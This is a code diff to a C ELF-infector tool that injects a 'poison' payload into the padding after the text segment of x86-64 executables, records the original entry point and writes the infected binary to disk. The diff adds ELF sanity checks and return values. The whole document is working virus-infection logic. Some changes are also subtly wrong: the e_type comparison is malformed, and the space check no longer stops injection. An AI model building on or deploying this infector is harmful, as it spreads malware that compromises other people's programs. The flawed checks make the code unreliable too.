@@ -90,7 +90,7 @@ int get_padding_size(Elf64_Ehdr* target_binary_header){
             target_binary_program_header->p_filesz += poison_size;
             target_binary_program_header->p_memsz += poison_size;
         }
-        else if (1 && target_binary_program_header->p_type == PT_LOAD && target_binary_program_header->p_flags == (PF_R | PF_W)){
+        else if (FOUND == 1 && target_binary_program_header->p_type == PT_LOAD && target_binary_program_header->p_flags == (PF_R | PF_W)){
             return target_binary_program_header->p_offset - end_of_text_segment;
         }
 
@@ -137,6 +137,24 @@ void inject_poison(char* injected_address){
     memcpy(target_memory_address + poison_offset, injected_address, poison_size);
 }
 
+int sanity_checks(Elf64_Ehdr* target_binary_header, char *target_binary){
+    // 1) verify if it is an elf file
+    if (target_binary_header->e_type == ET_NONE){
+        fprintf(stdout, AC_RED "[-] '%s' is not an elf file, poison was not injected\n" AC_NORMAL, target_binary);
+        return -1;
+    }
+    if (target_binary_header->e_type != (ET_EXEC|ET_DYN)){
+        fprintf(stdout, AC_RED "[-] '%s' is not an elf of type DYN or EXEC, poison was not injected\n" AC_NORMAL, target_binary);
+        return -1;
+    }
+    if (target_binary_header->e_machine != EM_X86_64){
+        fprintf(stdout, AC_RED "[-] architecture is not supprted, poison was not injected\n" AC_NORMAL);
+        return -1;
+    }
+    return 0;
+
+}
+
 
 
 int injector(char *target_binary, char*poison_binary){
@@ -144,10 +162,12 @@ int injector(char *target_binary, char*poison_binary){
     load_poison_binary_in_memory(poison_binary);
     char* injected_address = poison_address;
     Elf64_Ehdr* target_binary_header = (Elf64_Ehdr*)target_memory_address;
+    if (sanity_checks(target_binary_header, target_binary) != 0){
+        return -1;
+    }
     int pad_size = get_padding_size(target_binary_header);
     if (pad_size < poison_size){
         fprintf(stdout, AC_RED "[-] Not enough space for poison, binary '%s' was not infected...\n" AC_NORMAL, target_binary);
-        exit(0);
     }
     // save original entry point
     Elf64_Addr original_entry_point = target_binary_header->e_entry;
@@ -162,5 +182,6 @@ int injector(char *target_binary, char*poison_binary){
 
     fprintf(stdout, AC_MAGENTA "[+] Binary '%s' was infected with poison...\n" AC_NORMAL, target_binary);
     write_to_disk();
+    return 0;
 }
 
